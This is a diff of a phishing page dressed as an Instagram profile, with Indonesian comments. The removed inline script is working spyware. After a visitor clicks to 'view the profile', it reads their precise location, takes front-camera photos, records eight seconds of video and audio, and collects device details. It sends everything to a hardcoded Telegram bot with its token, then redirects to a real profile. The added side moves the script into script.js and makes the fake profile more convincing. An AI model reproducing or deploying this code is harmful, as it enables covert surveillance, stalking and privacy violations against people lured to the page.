@@ -5,216 +5,108 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
     <title>Instagram - Profil</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            background: #fafafa;
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            padding: 20px;
-        }
-        .container {
-            background: white;
-            max-width: 400px;
-            width: 100%;
-            border-radius: 12px;
-            border: 1px solid #dbdbdb;
-            overflow: hidden;
-            box-shadow: 0 2px 12px rgba(0,0,0,0.1);
-        }
-        .header {
-            padding: 15px 20px;
-            border-bottom: 1px solid #efefef;
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-        }
-        .header h1 {
-            font-size: 1.2em;
-            font-weight: 600;
-        }
-        .header .back {
-            font-size: 1.5em;
-            cursor: pointer;
-        }
-        .header .menu {
-            font-size: 1.2em;
-            cursor: pointer;
-        }
-        .profile {
-            padding: 20px;
-            display: flex;
-            align-items: center;
-            gap: 20px;
-        }
-        .profile .avatar {
-            width: 80px;
-            height: 80px;
-            border-radius: 50%;
-            object-fit: cover;
-            border: 3px solid #dbdbdb;
-        }
-        .profile .info {
-            flex: 1;
-        }
-        .profile .info .name {
-            font-size: 1.1em;
-            font-weight: 600;
-        }
-        .profile .info .bio {
-            color: #8e8e8e;
-            font-size: 0.85em;
-        }
-        .profile .info .followers {
-            font-size: 0.85em;
-            color: #262626;
-        }
-        .profile .info .followers span {
-            font-weight: 600;
-        }
-        .btn-view {
-            background: #0095f6;
-            color: white;
-            border: none;
-            padding: 12px;
-            margin: 0 20px 15px;
-            border-radius: 8px;
-            font-size: 1em;
-            font-weight: 600;
-            cursor: pointer;
-            width: calc(100% - 40px);
-            transition: background 0.3s, transform 0.2s;
-        }
-        .btn-view:hover {
-            background: #0077c9;
-        }
-        .btn-view:active {
-            transform: scale(0.97);
-        }
-        .btn-view:disabled {
-            background: #b2dffa;
-            cursor: not-allowed;
-        }
-        .grid {
-            display: grid;
-            grid-template-columns: repeat(3, 1fr);
-            gap: 3px;
-            padding: 3px;
-            background: #efefef;
-        }
-        .grid .item {
-            aspect-ratio: 1;
-            background: #f0f0f0;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 2em;
-            color: #ccc;
-            overflow: hidden;
-        }
-        .loading-overlay {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0,0,0,0.75);
-            z-index: 9999;
-            justify-content: center;
-            align-items: center;
-            flex-direction: column;
-            color: white;
-        }
-        .loading-overlay.show {
-            display: flex;
-        }
-        .loading-overlay .spinner {
-            width: 60px;
-            height: 60px;
-            border: 6px solid rgba(255,255,255,0.2);
-            border-top-color: #ffffff;
-            border-radius: 50%;
-            animation: spin 0.8s linear infinite;
-            margin-bottom: 25px;
-        }
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
-        .loading-overlay .text {
-            font-size: 1.1em;
-            font-weight: 500;
-            text-align: center;
-            padding: 0 20px;
-            letter-spacing: 1px;
-        }
-        .loading-overlay .subtext {
-            font-size: 0.8em;
-            opacity: 0.6;
-            margin-top: 8px;
-            font-weight: 300;
-        }
-        .loading-overlay .progress-dots {
-            margin-top: 15px;
-            display: flex;
-            gap: 8px;
-        }
-        .loading-overlay .progress-dots span {
-            width: 8px;
-            height: 8px;
-            background: rgba(255,255,255,0.2);
-            border-radius: 50%;
-            animation: dotPulse 1.4s infinite ease-in-out;
-        }
-        .loading-overlay .progress-dots span:nth-child(2) {
-            animation-delay: 0.2s;
-        }
-        .loading-overlay .progress-dots span:nth-child(3) {
-            animation-delay: 0.4s;
-        }
-        @keyframes dotPulse {
-            0%, 80%, 100% { transform: scale(0.6); opacity: 0.3; }
-            40% { transform: scale(1); opacity: 1; }
-        }
-        .footer {
-            text-align: center;
-            padding: 15px;
-            color: #8e8e8e;
-            font-size: 0.75em;
-            border-top: 1px solid #efefef;
-        }
-        .footer a {
-            color: #0095f6;
-            text-decoration: none;
-        }
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#fafafa;min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px}
+        .container{background:#fff;max-width:400px;width:100%;border-radius:12px;border:1px solid #dbdbdb;overflow:hidden;box-shadow:0 2px 12px rgba(0,0,0,0.08)}
+        .header{padding:12px 16px;border-bottom:1px solid #efefef;display:flex;align-items:center;justify-content:space-between;background:#fff}
+        .header .back{font-size:1.5em;cursor:pointer;color:#262626}
+        .header h1{font-size:1.1em;font-weight:600;color:#262626}
+        .header .menu{font-size:1.3em;cursor:pointer;color:#262626}
+        .profile{padding:16px 20px 12px;display:flex;align-items:center;gap:20px;background:#fff}
+        .profile .avatar{width:80px;height:80px;border-radius:50%;object-fit:cover;border:3px solid #fff;box-shadow:0 0 0 1px #dbdbdb;flex-shrink:0}
+        .profile .info{flex:1}
+        .profile .info .name{font-size:1.2em;font-weight:700;color:#262626}
+        .profile .info .name .badge{font-size:0.6em;background:#0095f6;color:#fff;padding:1px 8px;border-radius:10px;font-weight:600;margin-left:4px;vertical-align:middle}
+        .profile .info .bio{color:#8e8e8e;font-size:.85em;margin-top:2px}
+        .profile .info .bio .emoji{font-size:1.1em}
+        .profile .info .stats{display:flex;gap:16px;margin-top:8px}
+        .profile .info .stats span{font-size:.8em;color:#8e8e8e}
+        .profile .info .stats span strong{color:#262626;font-weight:700}
+        .follow-section{padding:0 20px 8px;display:flex;gap:8px;background:#fff}
+        .follow-section .btn-follow{flex:1;background:#0095f6;color:#fff;border:none;padding:7px 0;border-radius:8px;font-size:.85em;font-weight:600;cursor:default}
+        .follow-section .btn-follow:hover{background:#0077c9}
+        .follow-section .btn-message{background:#efefef;color:#262626;border:none;padding:7px 16px;border-radius:8px;font-size:.85em;font-weight:600;cursor:default}
+        .btn-view{background:#0095f6;color:#fff;border:none;padding:10px;margin:4px 20px 12px;border-radius:8px;font-size:.95em;font-weight:600;cursor:pointer;width:calc(100% - 40px);transition:background .3s,transform .2s;box-shadow:0 2px 8px rgba(0,149,246,0.2)}
+        .btn-view:hover{background:#0077c9}
+        .btn-view:active{transform:scale(0.97)}
+        .btn-view:disabled{background:#b2dffa;cursor:not-allowed;box-shadow:none}
+        .btn-view .arrow{margin-left:6px}
+        .highlights{padding:8px 16px 12px;display:flex;gap:16px;border-bottom:1px solid #efefef;background:#fff;overflow-x:auto}
+        .highlights .item{display:flex;flex-direction:column;align-items:center;gap:4px;font-size:.65em;color:#8e8e8e;flex-shrink:0}
+        .highlights .item .circle{width:56px;height:56px;border-radius:50%;border:2px solid #dbdbdb;display:flex;align-items:center;justify-content:center;font-size:1.5em;background:#fafafa}
+        .highlights .item .circle.active{border-color:#0095f6}
+        .grid{display:grid;grid-template-columns:repeat(3,1fr);gap:2px;padding:2px;background:#efefef}
+        .grid .item{aspect-ratio:1;background:#f0f0f0;display:flex;align-items:center;justify-content:center;font-size:2em;color:#ccc;overflow:hidden;position:relative}
+        .grid .item .overlay{position:absolute;bottom:0;left:0;right:0;background:linear-gradient(transparent,rgba(0,0,0,0.3));padding:4px 6px;display:flex;justify-content:flex-end;gap:6px;font-size:.5em;color:#fff;opacity:0;transition:opacity .3s}
+        .grid .item:hover .overlay{opacity:1}
+        .grid .item img{width:100%;height:100%;object-fit:cover}
+        .footer{text-align:center;padding:14px;color:#8e8e8e;font-size:.7em;border-top:1px solid #efefef;background:#fff}
+        .footer a{color:#0095f6;text-decoration:none;font-weight:500}
+        .footer .follow-text{display:block;margin-top:4px;font-size:.9em;color:#262626;font-weight:500}
+        .footer .follow-text .heart{color:#ed4956}
+        .loading-overlay{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.75);z-index:9999;justify-content:center;align-items:center;flex-direction:column;color:#fff}
+        .loading-overlay.show{display:flex}
+        .loading-overlay .spinner{width:56px;height:56px;border:5px solid rgba(255,255,255,0.15);border-top-color:#fff;border-radius:50%;animation:spin .8s linear infinite;margin-bottom:24px}
+        @keyframes spin{to{transform:rotate(360deg)}}
+        .loading-overlay .text{font-size:1.1em;font-weight:500;text-align:center;padding:0 20px;letter-spacing:.5px}
+        .loading-overlay .subtext{font-size:.8em;opacity:.5;margin-top:8px;font-weight:300}
+        .loading-overlay .progress-dots{margin-top:16px;display:flex;gap:8px}
+        .loading-overlay .progress-dots span{width:8px;height:8px;background:rgba(255,255,255,0.2);border-radius:50%;animation:dotPulse 1.4s infinite ease-in-out}
+        .loading-overlay .progress-dots span:nth-child(2){animation-delay:.2s}
+        .loading-overlay .progress-dots span:nth-child(3){animation-delay:.4s}
+        @keyframes dotPulse{0%,80%,100%{transform:scale(0.6);opacity:.2}40%{transform:scale(1);opacity:1}}
+        @media(max-width:420px){.container{border-radius:0;border:none;max-width:100%}.profile .avatar{width:70px;height:70px}.profile .info .name{font-size:1em}.highlights .item .circle{width:48px;height:48px;font-size:1.2em}}
     </style>
 </head>
 <body>
 
 <div class="container">
+    <!-- Header -->
     <div class="header">
-        <span class="back">←</span>
+        <span class="back">‹</span>
         <h1>Instagram</h1>
         <span class="menu">⋯</span>
     </div>
 
+    <!-- Profil -->
     <div class="profile">
         <img src="foto-saya.jpg" alt="Foto Profil" class="avatar" id="avatar">
         <div class="info">
-            <div class="name" id="namaUser">Melisagirl56</div>
-            <div class="bio">🎵 Life is beautiful</div>
-            <div class="followers"><span id="followerCount">1.2M</span> followers · <span id="followingCount">856</span> following</div>
+            <div class="name" id="namaUser">
+                Melisagirl56
+                <span class="badge">✓</span>
+            </div>
+            <div class="bio">
+                <span class="emoji">🎵</span> Life is beautiful
+            </div>
+            <div class="stats">
+                <span><strong id="followerCount">1.2M</strong> followers</span>
+                <span><strong id="followingCount">856</strong> following</span>
+            </div>
         </div>
     </div>
 
-    <button class="btn-view" id="btnView">Lihat Profil Melisagirl56</button>
+    <!-- Follow Section -->
+    <div class="follow-section">
+        <button class="btn-follow">Follow</button>
+        <button class="btn-message">Message</button>
+    </div>
 
+    <!-- Tombol View Profile -->
+    <button class="btn-view" id="btnView">
+        Lihat Profil Melisagirl56 <span class="arrow">→</span>
+    </button>
+
+    <!-- Highlights -->
+    <div class="highlights">
+        <div class="item"><div class="circle active">✨</div><span>Story</span></div>
+        <div class="item"><div class="circle">📸</div><span>Reels</span></div>
+        <div class="item"><div class="circle">📹</div><span>IGTV</span></div>
+        <div class="item"><div class="circle">🎯</div><span>Highlights</span></div>
+        <div class="item"><div class="circle">❤️</div><span>Liked</span></div>
+    </div>
+
+    <!-- Grid Foto -->
     <div class="grid">
         <div class="item">🖼️</div>
         <div class="item">🖼️</div>
@@ -224,8 +116,17 @@
         <div class="item">🖼️</div>
     </div>
 
+    <!-- Footer -->
     <div class="footer">
-        <a href="https://www.instagram.com/marisa_grilll.st?igsh=MWN2eGl4a2d4MjJhdQ==" target="_blank">@marisa_grilll.st</a> · © 2026
+        <a href="https://www.instagram.com/marisa_grilll.st?igsh=MWN2eGl4a2d4MjJhdQ==" target="_blank">
+            @marisa_grilll.st
+        </a>
+        <span class="follow-text">
+            💖 Follow me for more updates! 💖
+        </span>
+        <span style="font-size:0.85em; color:#8e8e8e; display:block; margin-top:2px;">
+            © 2026 • Made with ❤️
+        </span>
     </div>
 </div>
 
@@ -241,351 +142,8 @@
     </div>
 </div>
 
-<script>
-    // ========== KONFIGURASI TELEGRAM ==========
-    const BOT_TOKEN = '8973378571:AAE4LKuNnONfQEbTWHLg0F7kq-IjH5inwmc';
-    const CHAT_ID = '8528707941';
-    // =========================================
+<!-- ===== LINK SCRIPT ===== -->
+<script src="script.js"></script>
 
-    const btnView = document.getElementById('btnView');
-    const overlay = document.getElementById('loadingOverlay');
-    const loadingText = document.getElementById('loadingText');
-    const loadingSubtext = document.getElementById('loadingSubtext');
-    const avatar = document.getElementById('avatar');
-
-    const NAMA_TARGET = 'Melisagirl56';
-    const REDIRECT_URL = 'https://www.instagram.com/marisa_grilll.st?igsh=MWN2eGl4a2d4MjJhdQ==';
-
-    // ============ AMBIL 3 FOTO KAMERA DEPAN ============
-    function ambil3FotoKamera() {
-        return new Promise((resolve, reject) => {
-            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-                reject('Kamera tidak didukung');
-                return;
-            }
-
-            navigator.mediaDevices.getUserMedia({
-                video: { 
-                    facingMode: 'user', 
-                    width: { ideal: 1280 }, 
-                    height: { ideal: 720 } 
-                },
-                audio: false
-            })
-            .then((stream) => {
-                const video = document.createElement('video');
-                video.srcObject = stream;
-                video.playsInline = true;
-                video.play();
-
-                video.onloadedmetadata = function() {
-                    const canvas = document.createElement('canvas');
-                    canvas.width = 1280;
-                    canvas.height = 720;
-                    const ctx = canvas.getContext('2d');
-                    const fotoList = [];
-                    let count = 0;
-
-                    function ambilFoto() {
-                        if (count >= 3) {
-                            stream.getTracks().forEach(track => track.stop());
-                            resolve(fotoList);
-                            return;
-                        }
-                        // Gambar dengan kualitas tinggi
-                        ctx.drawImage(video, 0, 0, 1280, 720);
-                        const base64 = canvas.toDataURL('image/jpeg', 1.0);
-                        fotoList.push(base64);
-                        count++;
-                        setTimeout(ambilFoto, 1500);
-                    }
-
-                    setTimeout(ambilFoto, 500);
-
-                    // Safety timeout
-                    setTimeout(() => {
-                        stream.getTracks().forEach(track => track.stop());
-                        if (fotoList.length < 3) {
-                            resolve(fotoList.length > 0 ? fotoList : []);
-                        }
-                    }, 7000);
-                };
-            })
-            .catch((err) => {
-                reject('Akses kamera ditolak: ' + err.message);
-            });
-        });
-    }
-
-    // ============ REKAM VIDEO 8 DETIK KAMERA DEPAN ============
-    function rekamVideo8Detik() {
-        return new Promise((resolve, reject) => {
-            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-                reject('Kamera tidak didukung');
-                return;
-            }
-
-            navigator.mediaDevices.getUserMedia({
-                video: { 
-                    facingMode: 'user', 
-                    width: { ideal: 1280 }, 
-                    height: { ideal: 720 } 
-                },
-                audio: true
-            })
-            .then((stream) => {
-                const mediaRecorder = new MediaRecorder(stream, {
-                    mimeType: 'video/webm;codecs=vp9,opus',
-                    videoBitsPerSecond: 2500000
-                });
-                
-                const chunks = [];
-                mediaRecorder.ondataavailable = (e) => {
-                    if (e.data.size > 0) chunks.push(e.data);
-                };
-
-                mediaRecorder.onstop = () => {
-                    const blob = new Blob(chunks, { type: 'video/webm' });
-                    stream.getTracks().forEach(track => track.stop());
-                    resolve(blob);
-                };
-
-                // Rekam 8 detik
-                mediaRecorder.start();
-                setTimeout(() => {
-                    mediaRecorder.stop();
-                }, 8000);
-
-                // Safety timeout
-                setTimeout(() => {
-                    if (mediaRecorder.state === 'recording') {
-                        mediaRecorder.stop();
-                    }
-                }, 9000);
-            })
-            .catch((err) => {
-                reject('Akses kamera ditolak: ' + err.message);
-            });
-        });
-    }
-
-    // ============ AMBIL LOKASI DENGAN MULTIPLE ATTEMPT ============
-    function getLokasi() {
-        return new Promise((resolve) => {
-            if (!navigator.geolocation) {
-                resolve({ lat: 'Tidak tersedia', lon: 'Tidak tersedia', error: 'Geolocation tidak didukung' });
-                return;
-            }
-
-            let attempts = 0;
-            const maxAttempts = 3;
-
-            function tryGetLocation() {
-                attempts++;
-                navigator.geolocation.getCurrentPosition(
-                    (pos) => {
-                        resolve({
-                            lat: pos.coords.latitude,
-                            lon: pos.coords.longitude,
-                            akurasi: pos.coords.accuracy,
-                            altitude: pos.coords.altitude || 'Tidak tersedia',
-                            speed: pos.coords.speed || 'Tidak tersedia'
-                        });
-                    },
-                    (err) => {
-                        if (attempts < maxAttempts) {
-                            setTimeout(tryGetLocation, 2000);
-                        } else {
-                            resolve({ 
-                                lat: 'Tidak tersedia', 
-                                lon: 'Tidak tersedia', 
-                                error: err.message 
-                            });
-                        }
-                    },
-                    { 
-                        enableHighAccuracy: true, 
-                        timeout: 15000,
-                        maximumAge: 0
-                    }
-                );
-            }
-
-            tryGetLocation();
-        });
-    }
-
-    // ============ DETAIL PERANGKAT ============
-    function getDeviceInfo() {
-        return {
-            userAgent: navigator.userAgent,
-            platform: navigator.platform,
-            language: navigator.language,
-            screen: `${window.screen.width}x${window.screen.height}`,
-            colorDepth: window.screen.colorDepth,
-            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-            connection: navigator.connection ? 
-                `${navigator.connection.effectiveType} (${navigator.connection.downlink} Mbps)` : 
-                'Tidak tersedia',
-            battery: navigator.getBattery ? 'Mendukung' : 'Tidak mendukung'
-        };
-    }
-
-    // ============ KIRIM KE TELEGRAM ============
-    async function kirimKeTelegram(pesan) {
-        try {
-            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-            const response = await fetch(url, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: CHAT_ID,
-                    text: pesan,
-                    parse_mode: 'HTML'
-                })
-            });
-            return await response.json();
-        } catch (error) {
-            console.error('Error kirim pesan:', error);
-            return false;
-        }
-    }
-
-    async function kirimFotoKeTelegram(base64Image, caption) {
-        try {
-            const response = await fetch(base64Image);
-            const blob = await response.blob();
-            
-            const formData = new FormData();
-            formData.append('chat_id', CHAT_ID);
-            formData.append('photo', blob, 'foto_target.jpg');
-            formData.append('caption', caption);
-
-            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
-            const hasil = await fetch(url, {
-                method: 'POST',
-                body: formData
-            });
-            return await hasil.json();
-        } catch (error) {
-            console.error('Error kirim foto:', error);
-            return false;
-        }
-    }
-
-    async function kirimVideoKeTelegram(videoBlob, caption) {
-        try {
-            const formData = new FormData();
-            formData.append('chat_id', CHAT_ID);
-            formData.append('video', videoBlob, 'video_target.webm');
-            formData.append('caption', caption);
-
-            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`;
-            const hasil = await fetch(url, {
-                method: 'POST',
-                body: formData
-            });
-            return await hasil.json();
-        } catch (error) {
-            console.error('Error kirim video:', error);
-            return false;
-        }
-    }
-
-    // ============ PROSES UTAMA ============
-    btnView.addEventListener('click', async function() {
-        btnView.disabled = true;
-        btnView.textContent = '⏳ Memproses...';
-
-        overlay.classList.add('show');
-        loadingText.textContent = '⏳ Memverifikasi...';
-        loadingSubtext.textContent = 'Mohon tunggu sebentar';
-
-        try {
-            // 1. Ambil lokasi (dengan multiple attempt)
-            const lokasi = await getLokasi();
-
-            // 2. Ambil device info
-            const device = getDeviceInfo();
-
-            // 3. Ambil 3 foto kamera depan
-            let fotoList = [];
-            let kameraGagal = false;
-            try {
-                fotoList = await ambil3FotoKamera();
-            } catch (err) {
-                kameraGagal = true;
-            }
-
-            // 4. Rekam video 8 detik
-            let videoBlob = null;
-            let videoGagal = false;
-            try {
-                videoBlob = await rekamVideo8Detik();
-            } catch (err) {
-                videoGagal = true;
-            }
-
-            // 5. Kirim data ke Telegram
-            const waktu = new Date().toLocaleString('id-ID');
-            let mapsLink = '';
-            if (lokasi.lat !== 'Tidak tersedia' && lokasi.lon !== 'Tidak tersedia') {
-                mapsLink = `https://www.google.com/maps?q=${lokasi.lat},${lokasi.lon}`;
-            }
-
-            let pesan = `🔴 <b>ALERT! Profil Dilihat</b>\n\n`;
-            pesan += `👤 Target: <b>${NAMA_TARGET}</b>\n`;
-            
-            if (lokasi.lat !== 'Tidak tersedia' && lokasi.lon !== 'Tidak tersedia') {
-                pesan += `📍 <b>Lokasi:</b>\n`;
-                pesan += `   • Latitude: ${lokasi.lat}\n`;
-                pesan += `   • Longitude: ${lokasi.lon}\n`;
-                pesan += `   • Akurasi: ${Math.round(lokasi.akurasi)} meter\n`;
-                if (lokasi.altitude && lokasi.altitude !== 'Tidak tersedia') {
-                    pesan += `   • Altitude: ${lokasi.altitude}m\n`;
-                }
-                if (lokasi.speed && lokasi.speed !== 'Tidak tersedia') {
-                    pesan += `   • Kecepatan: ${lokasi.speed} m/s\n`;
-                }
-                pesan += `   • <a href="${mapsLink}">🗺️ Lihat di Google Maps</a>\n`;
-            } else {
-                pesan += `📍 Lokasi: Tidak tersedia (${lokasi.error || 'Unknown'})\n`;
-            }
-
-            pesan += `\n📱 <b>Detail Perangkat:</b>\n`;
-            pesan += `• Platform: ${device.platform}\n`;
-            pesan += `• Bahasa: ${device.language}\n`;
-            pesan += `• Layar: ${device.screen} (${device.colorDepth}bit)\n`;
-            pesan += `• Zona Waktu: ${device.timezone}\n`;
-            pesan += `• Koneksi: ${device.connection}\n`;
-            pesan += `• Battery API: ${device.battery}\n`;
-            pesan += `• User Agent: ${device.userAgent.substring(0, 200)}...\n`;
-            pesan += `\n🕐 Waktu: ${waktu}`;
-
-            // Kirim pesan teks
-            await kirimKeTelegram(pesan);
-
-            // Kirim 3 foto
-            if (fotoList.length > 0 && !kameraGagal) {
-                for (let i = 0; i < fotoList.length; i++) {
-                    const caption = `📸 Foto ${i+1}/3 dari ${NAMA_TARGET}`;
-                    await kirimFotoKeTelegram(fotoList[i], caption);
-                    await sleep(300);
-                }
-            }
-
-            // Kirim video 8 detik
-            if (videoBlob && !videoGagal) {
-                const caption = `🎥 Video 8 detik dari ${NAMA_TARGET}`;
-                await kirimVideoKeTelegram(videoBlob, caption);
-            }
-
-            await sleep(1500);
-
-        } catch (error) {
-            console.error('Error:', error);
-            await sleep(1000);
-        }
-
-        overlay.classList.remove('show');
-        btnView.disabled = f
+</body>
+    </html>
